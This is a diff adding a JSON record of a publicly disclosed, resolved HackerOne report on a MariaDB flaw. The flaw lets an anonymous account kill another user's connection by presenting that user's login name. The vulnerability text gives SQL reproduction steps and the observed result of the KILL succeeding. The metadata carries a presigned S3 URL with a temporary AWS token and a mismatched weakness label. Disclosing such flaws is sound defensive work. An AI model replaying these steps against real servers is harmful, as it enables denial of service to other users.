@@ -1,0 +1,110 @@
+{
+  "id": 3897588,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODk3NTg4",
+  "url": "https://hackerone.com/reports/3897588",
+  "title": "KILL authorization trusts the presented login name instead of the authenticated anonymous account",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-28T22:26:37.695Z",
+  "submitted_at": "2026-07-28T22:26:37.843Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dogeshark",
+    "url": "/dogeshark",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/s1ckuo6sagho9bmkiry5gvc9kqkm/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b?response-content-disposition=inline%3B%20filename%3D%222A202068-4AB8-4CE0-8E7D-4B5410336701.png%22%3B%20filename%2A%3DUTF-8%27%272A202068-4AB8-4CE0-8E7D-4B5410336701.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MKXF3PP%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215447Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJGMEQCIHB7S8Atccc19Lx%2Fm5FwswSIo%2BvXxRdAcMF4F0vMZgxAAiAmHtOEw3fRIcsq5KY8jGvmpJ9DEbFCWnWUpUoJNdwziyqyBQhGEAMaDDAxMzYxOTI3NDg0OSIMIPPfVqzUiz40Q812Ko8Fq%2B%2B0LHuHNt15zPRT0j6%2F%2Ft%2BXSJLBAUPD7byZro5wYNQYbzWnIn4baqhpSulD6huWL4q81J9GBnISWnthJNAmCtnXf7bAgnK5m0Rlo2KnL9Olr91Z4lPBNO5Iub9BTH8QtYWUyMNuBi4kXrJQobzMQFTJ4l1giRc6Y4lmN94m0jDF10ty0tTBEwq%2BYCV%2BUp%2FORhs01T2Yhh0ZS6uc1yLIWtI3uN%2BBvyMooQwjNjJJFnWJsXLiz6cHgsvYsbi64QshYo9C8y6DDaKvhIQcPxQlxjSpWPdGMUFYW%2BIFzX1tqsABp66rtPgg4MnNwRjpPLUAndJOZR%2Fepd6Lc6RqZYywRF0iYoZ8WUkhDVae9M%2FWcYRVplY3BrJConMW%2Fz6ca4r%2FbClYcwoK3KrO4IAH9SgJxR6d5pOUBW5FSqNuZiJp%2FgYxp%2BNpCchV29EF8c6FQwJhgrCUWtOI6JOheXthp6MnoHkoznVeItG3zZyJkJFgJh6zROmONuGfZJ064hDb3gYEW9HlGS0ScAT1jy4F5BvH2m4ThRth7Gv1xZ0oIhdIRvG0pZyTlzRHxR24Lte6O6JGRSoY6eCFKztlHRpxewC1GoFfHf3ipg%2B6tKBwoJgfLdZ4qwwZEoCW8Mn7sZ0SqaxBCB9d0pssN1%2FmNE5W8%2BcR3v0w3%2FydqNntawZfweooyv%2Fx92nJSw1zJd3fHjc1R3JwbBZ1E2erq7m0ZVdmQEzLthdoHxfOIYn30%2BA%2B4BF1ia6eis6%2BR4%2BhFc2CZYtcZeAwG2udob4OonIyHg%2BK4HO3kXNNuy5awCghOc68JJcYjGk2K1FPc8bt6TONoUShcz1rguj3BKqoBIfr7fQbOxayJ9cLhY%2Fa7cJ48TlytziQszDPxvzUBjqyAVPVcf%2BeGOhyfKZWwH0KJr5iezyDHXLEVEl9%2BrqtPiJG4HTEHllvEOnhYxzEj3yfhvYmMR7JsRv6UW1XRLUre1%2BSJA%2FxabWeby2UKn1JZQm7JdvPgxYsMxYpC1a2VNVB4pNqDzUVOqTolAIM6rTZpBUSEP41NvZ5CoJVgQXuIDgFO4P0pBIrA4QOSfKr9W0NEu6WoiAOvuwWkqER5xPw93KdN%2B14nBdmcFboxG19nX7gA1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa161dc5b60e7e25d7d82a41ff9ede0d5af9a5c2eaee5d3413d3b95d8b50420d"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-07T19:55:50.844Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-07T19:55:50.702Z",
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:55:03.618Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Summary\n\nWhen a supplied username falls back to an anonymous MariaDB account, the security\ncontext retains the supplied login name in `user` while the authenticated identity in\n`priv_user` is empty. KILL authorization compares `user`, allowing the anonymous\nsession to kill a connection whose user matches the attacker-supplied login name.\n\n\nPreconditions\n\n- An anonymous account matches the attacker's source address.\n- A victim connection uses a username the attacker can present from an address where\n  the victim's actual account does not match.\n\n## Setup\n\n```sql\nCREATE USER ''@'127.0.0.1';\nCREATE USER 'killvictim'@'localhost'\n  IDENTIFIED BY 'victim-test-only';\nFLUSH PRIVILEGES;\n```\n\nStart a victim session over the UNIX socket:\n\n```sql\nSELECT SLEEP(20);\n```\n\nRecord its connection ID from an administrative session.\n\nConnect over TCP while presenting `killvictim` and no password:\n\n```sql\nSELECT USER(), CURRENT_USER();\nKILL CONNECTION <victim_connection_id>;\n```\n\n## Observed result\n\n```text\nUSER()          = killvictim@127.0.0.1\nCURRENT_USER()  = @127.0.0.1\nKILL result     = success\nvictim result   = connection terminated\n```\n\nThe attacker command exited successfully and the victim's sleeping client failed\nbecause its connection was closed.\n\n## Expected result\n\nThe anonymous session should receive `ER_KILL_DENIED_ERROR` because it lacks the\ncross-user connection-administration privilege and is not the authenticated owner of\nthe victim session.\n\n\nRoot cause\n\n`kill_one_thread()` accepts the operation when `user_matches()` succeeds.\n`Security_context::user_matches()` compares `user`, which is the client-supplied login\nname, rather than `priv_user`, which identifies the matched ACL account.\n\nRelevant locations:\n\n- `sql/sql_parse.cc:9187-9188`\n- `sql/sql_class.cc:5091-5095`\n- `sql/sql_acl.cc:16259-16283`\n\n## Suggested remediation\n\nBase ownership checks on authenticated `priv_user` and host/account context. Add an\nexplicit fail-closed check for anonymous authenticated identities before allowing\nsame-user KILL operations.\n\n## Impact\n\nAn anonymous database account can terminate another principal's connections or\nqueries by presenting that principal's username. This enables cross-user denial of\nservice and can interrupt in-progress database work.",
+  "weakness": {
+    "id": 13,
+    "name": "Incorrect Calculation of Buffer Size"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:55:03.904Z",
+  "allow_singular_disclosure_after": 2584816.088423657,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "al-theeb"
+  ],
+  "structured_scope": {
+    "databaseId": 10337,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors  - Denial of Service",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
